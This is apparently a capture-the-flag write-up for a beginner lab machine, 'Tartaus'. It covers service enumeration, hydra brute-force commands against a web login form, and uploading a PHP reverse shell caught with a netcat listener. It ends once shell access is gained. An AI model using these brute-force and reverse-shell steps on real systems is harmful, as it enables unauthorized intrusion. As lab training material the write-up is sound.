### Tartaus Writeup

>This is a beginner box based on simple enumeration of services and basic privilege escalation techniques.

- Scan the machine
- Check ftp with anon. login
    - Nothing interesting
- Check robots.txt
- Check /admin-dir
- wget userid and credentials.txt
- use hydra to rack username and password

Finding the username
```
hydra -L userid -P credentials.txt 10.10.191.122 http-post-form "/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:Incorrect username"
```

Finding the password
```
hydra -l enox -P credentials.txt 10.10.191.122 http-post-form "/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:Incorrect password"
```

- A page to upload content
- Use it go upload a php-reverse-shell and listen to the specified port on your machine
    - https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
    - Use your tun0 ip addr as the IP and specify an port
    - Upload the shell
    - Listen on the port in your machine
    - nc -nlvp <port>
    - Once uploaded you get access to the shell
